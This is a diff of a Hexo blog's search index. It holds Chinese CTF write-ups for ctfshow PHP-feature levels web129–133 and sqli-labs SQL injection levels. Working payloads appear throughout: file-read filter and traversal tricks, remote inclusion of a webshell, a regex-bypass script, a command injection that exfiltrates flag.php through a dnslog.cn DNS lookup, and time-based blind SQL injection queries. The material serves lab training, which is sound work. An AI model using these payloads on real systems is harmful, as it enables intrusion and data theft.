+      <tags>
+        <tag>CTF</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow-web入门-php特性</title>
     <url>/2022/12/15/ctfshow-web%E5%85%A5%E9%97%A8-php%E7%89%B9%E6%80%A7/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了继续巩固php基础！</p>
@@ -2095,6 +2189,80 @@ gopher发送get请求</li>
 <li>构造payload<br>参数f1用下划线绕开检查，然后参数f2可以使用get_defined_vars返回所有信息，其中就包括了变量名与变量的值。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>
 成功拿到flag</li>
 </ol>
+<h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li>stripos()函数<br>查找字符串首次出现的位置（不区分大小写）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stripos(string $haystack, string $needle, int $offset = 0): int|false</span><br><span class="line">返回在字符串 haystack 中 needle 首次出现的数字位置。</span><br><span class="line">与 strpos() 不同，stripos() 不区分大小写。</span><br><span class="line">在 PHP 8.0.0 之前，如果 needle 不是字符串，则会将其转换为整数并用作字符的序数值。此行为自 PHP 7.3.0 起已弃用，强烈建议不要依赖它。</span><br><span class="line">根据预期的行为，needle应该显式转换为字符串，或者应该执行对 chr() 的显式调用。</span><br><span class="line">返回值</span><br><span class="line">返回 needle 存在于 haystack 字符串开始的位置(独立于偏移量)。同时注意字符串位置起始于 0，而不是 1。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>通过GET方式传入变量f，要求变量f中有字符串ctfshow且不在第1位。</p>
+<ol start="2">
+<li>构造payload<br>要绕开readfile的方式有三种，</li>
+</ol>
+<ul>
+<li>第1种：<br>使用php伪协议绕过：<br><code>?f=php://fiter/ctfshow/resource=flag.php</code></li>
+<li>第2种：<br>使用目录穿越的方式绕过：<br><code>?f=./ctfshow/../flag.php</code></li>
+<li>第3种：<br>远程文件包含，在自己的服务器上写个一句话，然后保存为txt文档。<br><code>f=http://url/123.txt?ctfshow</code><br>其中123.txt为一句话木马。</li>
+</ul>
+<p>成功拿到flag</p>
+<h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li>PCRE回溯次数限制<br>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将返回 false。<br>可以参考这篇文章：<a href="leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></li>
+</ul>
+<p>通过POST传入一个参数f，第1个if语句将f进行preg_match正则匹配，点号(.)表示任意单个字符串（但不会匹配换行符\n），加号(+)表示匹配1次或多次，问号(?)表示匹配0次或1次匹配前面的字符串。i表示不区分大小写，s表示匹配任何空白字符，包括空格、制表符和换页符。<br>若未匹配到进入下一个if语句匹配字符串中是否有字符ctfshow。<br>通过两个if语句即可拿到flag。</p>
+<ol start="2">
+<li>构造payload</li>
+</ol>
+<ul>
+<li><p>第1种<br>根据PCRE回溯次数限制，我们可以写个python脚本让回溯次数超过1000000次，这样就能绕开preg_match，将ctfshow有效传下去，脚本如下：</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ce455ed5-7390-42ee-b754-0f64b36f4551.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;f&quot;</span>: <span class="string">&quot;1111&quot;</span>*<span class="number">250000</span>+<span class="string">&quot;ctfshow&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(requests.post(url=url, data=data).text)</span><br></pre></td></tr></table></figure>
+<p>运行后成功拿到flag</p>
+</li>
+<li><p>第2种<br>根据该preg_match可知，需要先匹配了任意单个字符串后才会匹配是否存在ctfshow，如果我们一开始就匹配ctfshow，则能直接绕过：<br>POST: <code>f=ctfshow</code></p>
+</li>
+<li><p>第3种<br>preg_match无法处理数组，于是可以通过传入数组绕开：<br>POST: <code>f[]=</code> 或 <code>f=ctfshow[]</code></p>
+</li>
+<li><p>第4种<br>由于正则中的点号(.)不会匹配\n，因此可以通过换行符绕过：<br>POST: <code>f=ctfshow\n</code></p>
+</li>
+</ul>
+<h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><ol>
+<li><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>和上一题相似度很高，区别在于通过POST传入的变量均进行了字符串化，这样一来无法使用数组和换行符绕过。<br>第2个if语句匹配的字符串成了36Dctfshow，无法直接传参绕过正则。</p>
+</li>
+<li><p>构造payload<br>上一题的第1种方法还能使用，只是需要稍微改改脚本罢了。</p>
+</li>
+</ol>
+<h1 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h1><ol>
+<li>查看源码<br>一开始出现了个博客页面，我还以为自己搞错了，做了那么多直接显示源代码的题，没反应过来…<br>首先拿后台扫描工具爆破下：<br>我们可以看到 <code>/admin</code> 会显示有跳转，于是直接访问admin页面，那么得到了真正需要的php源码。或者 <code>robots.txt</code> 也可显示真正需要访问的页面。<br>这个题应该是模拟后台管理员登录。<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li>mt_rand()函数<br>通过梅森旋转（Mersenne Twister）随机数生成器生成随机值。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_rand(int $min, int $max): int</span><br><span class="line">警告</span><br><span class="line">本函数并不会生成安全加密的值，并且不可用于加密或者要求返回值不可猜测的目的。</span><br><span class="line">mt_rand() 函数是旧的 rand() 的临时替代。该函数用了» 梅森旋转中已知的特性作为随机数发生器，它可以产生随机数值的平均速度比 libc 提供的 rand() 快四倍。</span><br></pre></td></tr></table></figure>
+通过GET传入三个参数username,password和code<br>三个参数均进行了string转换，在第1个if语句判断中，注意到 <code>||</code> 。<br>于是可以只满足一个条件，即： <code>$username ===&quot;admin&quot;</code><br>因此参数code和password可控。<br>第2个if语句中，code需要满足等于admin的条件，于是直接构造payload如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6c73c641-6607-49de-9ff8-757e351e1ab6.challenge.ctf.show/admin/?username=admin&amp;password=&amp;code=admin</span><br></pre></td></tr></table></figure>
+成功拿到flag</li>
+</ul>
+<h1 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h1><ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><p>@</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$F = @$_GET[&#x27;F&#x27;]</span><br><span class="line">其中的 @ 是为了防止没有 $_GET[&#x27;F&#x27;]出现错误提示.</span><br><span class="line">但是 @ 的代价过高, 一般都用 isset() 来判断一下</span><br><span class="line">相当于isset()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>linux grep,tr命令<br>Linux grep 命令用于查找文件里符合条件的字符串。<br>Linux tr 命令用于转换或删除文件中的字符。<br>详细解释：<a href="https://www.runoob.com/linux/linux-comm-grep.html">Linux grep 命令</a> 和 <a href="https://www.runoob.com/linux/linux-comm-tr.html">Linux tr命令</a></p>
+</li>
+<li><p>curl -c 命令<br>-c参数将服务器设置的 Cookie 写入一个文件。<br><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南</a></p>
+</li>
+<li><p>shell_exec()函数<br>``是shell_exec()函数的缩写。shell_exec — 通过 webshell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
+</li>
+</ul>
+<p>通过GET传入一个参数F，然后进行正则匹配。如果通过则将6个字符输出为代码。<br>这里需要用变量覆盖，自己覆盖自己，从而绕过substr。有点像双写绕过。</p>
+<ol start="2">
+<li>构造payload<br>使用变量覆盖: ?F&#x3D;`$F`;<br>如此一来自己覆盖自己，第1次能够通过substr，第2次就不需要通过substr，能够完整输出了。因此可以在6个字符之后加需要的命令来返回flag。<br>使用dnslog生成子域名，将得到的子域名放入GET中，在返回的查询记录中得到flag，构造payload如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.o9u0j4.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>
+在查询记录中显示如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flagctfshow6a739952ac4b406ea6890b16d9a5c293.o9u0j4.dnslog.cn</span><br></pre></td></tr></table></figure>
+通过构造flag的格式，8 4 4 4 12加上-即可成功拿到flag。<br>另外的方法可参考这篇文章：<a href="https://blog.csdn.net/qq_46091464/article/details/109095382">ctfshow web133</a></li>
+</ol>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -2103,22 +2271,6 @@ gopher发送get请求</li>
       <tags>
         <tag>CTF</tag>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTFSHOW_web入门_SQL注入</title>
-    <url>/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<span id="more"></span>
-<p>web172<br>打开F12，发现js，访问后，发现最后几行代码有关于输入的部分，于是随手输入一个：<br><code>url/api/?id=1</code><br>发现显示出数据，于是先构造一个：<br><code>url/api/?id=1&#39;or 1=1 --+</code><br>得到全部数据，但我们翻到最下面，显示flag不在这里，那说明flag应该是在另一个表里，于是进行常规注入，最后在ctfshow_user2的表里发现了flag。
- </p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2168,6 +2320,42 @@ gopher发送get请求</li>
       </tags>
   </entry>
   <entry>
+    <title>CTFSHOW_web入门_SQL注入</title>
+    <url>/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<span id="more"></span>
+<p>web172<br>打开F12，发现js，访问后，发现最后几行代码有关于输入的部分，于是随手输入一个：<br><code>url/api/?id=1</code><br>发现显示出数据，于是先构造一个：<br><code>url/api/?id=1&#39;or 1=1 --+</code><br>得到全部数据，但我们翻到最下面，显示flag不在这里，那说明flag应该是在另一个表里，于是进行常规注入，最后在ctfshow_user2的表里发现了flag。
+ </p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2022/11/03/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<span id="more"></span>
+
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>First Blog</title>
     <url>/2022/11/03/first_blog/</url>
     <content><![CDATA[<p><img src="/images/Christina.png" alt="Kurisu Makise"></p>
@@ -2209,26 +2397,6 @@ gopher发送get请求</li>
         <tag>随想</tag>
         <tag>搭建博客</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2022/11/03/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<span id="more"></span>
-
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>SQL注入之sqli-labs_1+2</title>
@@ -2347,42 +2515,6 @@ gopher发送get请求</li>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_13+14+15+16</title>
-    <url>/2022/11/10/sqli-labs_13-16/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识都是前面已经出现过的，只是提交方式不同，没什么难度。</p>
-<span id="more"></span>
-
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure>
-<p>构造成功，然后使用时间盲注</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure>
-<p>以此类推</p>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第14关差不多，只是构造方式变成了双引号"><a href="#第14关差不多，只是构造方式变成了双引号" class="headerlink" title="第14关差不多，只是构造方式变成了双引号"></a>第14关差不多，只是构造方式变成了双引号</h2><h2 id="第15关和第11关差不多"><a href="#第15关和第11关差不多" class="headerlink" title="第15关和第11关差不多"></a>第15关和第11关差不多</h2><h2 id="第16关和第12关差不多"><a href="#第16关和第12关差不多" class="headerlink" title="第16关和第12关差不多"></a>第16关和第12关差不多</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有手就行</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs_17</title>
     <url>/2022/11/11/sqli-labs_17/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始有了新变化，是一个更新密码的页面，这说明已经成功进入了系统，接下来就看看如何解决吧。</p>
@@ -2411,6 +2543,42 @@ gopher发送get请求</li>
 </ol>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本关的重点在于找到注入方式，如何去通过报错注入获取所需信息。技术上仍然还是那些。也可参见第二篇致谢的其它报错函数注入。</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://cloud.tencent.com/developer/article/1906116">全网最全sqli-labs通关攻略</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_13+14+15+16</title>
+    <url>/2022/11/10/sqli-labs_13-16/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识都是前面已经出现过的，只是提交方式不同，没什么难度。</p>
+<span id="more"></span>
+
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure>
+<p>构造成功，然后使用时间盲注</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure>
+<p>以此类推</p>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="第14关差不多，只是构造方式变成了双引号"><a href="#第14关差不多，只是构造方式变成了双引号" class="headerlink" title="第14关差不多，只是构造方式变成了双引号"></a>第14关差不多，只是构造方式变成了双引号</h2><h2 id="第15关和第11关差不多"><a href="#第15关和第11关差不多" class="headerlink" title="第15关和第11关差不多"></a>第15关和第11关差不多</h2><h2 id="第16关和第12关差不多"><a href="#第16关和第12关差不多" class="headerlink" title="第16关和第12关差不多"></a>第16关和第12关差不多</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有手就行</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -2649,6 +2817,49 @@ gopher发送get请求</li>
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_25+25a</title>
+    <url>/2022/11/17/sqli-labs_25+25a/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关页面上有明显提示，可以巧妙利用一下</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li>测试并判断注入类型<br>首先本关页面出现了明显提示，or和and似乎都不能使用了。但我们检查源码时，我们可以发现这一段函数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
